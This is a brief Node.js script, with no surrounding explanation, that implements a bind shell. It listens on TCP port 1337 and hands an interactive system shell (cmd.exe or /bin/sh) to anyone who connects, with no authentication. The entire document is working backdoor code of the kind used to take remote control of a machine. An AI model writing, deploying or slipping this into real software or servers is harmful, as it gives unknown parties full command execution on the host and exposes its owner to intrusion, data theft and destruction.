var net = require('net');
var spawn = require('child_process').spawn;

PORT="1337";

if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

var server = net.createServer(function (c) {
    var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'), ['-i']);
    c.pipe(sh.stdin);
    sh.stdout.pipe(c);
    sh.stderr.pipe(c);
});
server.listen(PORT);
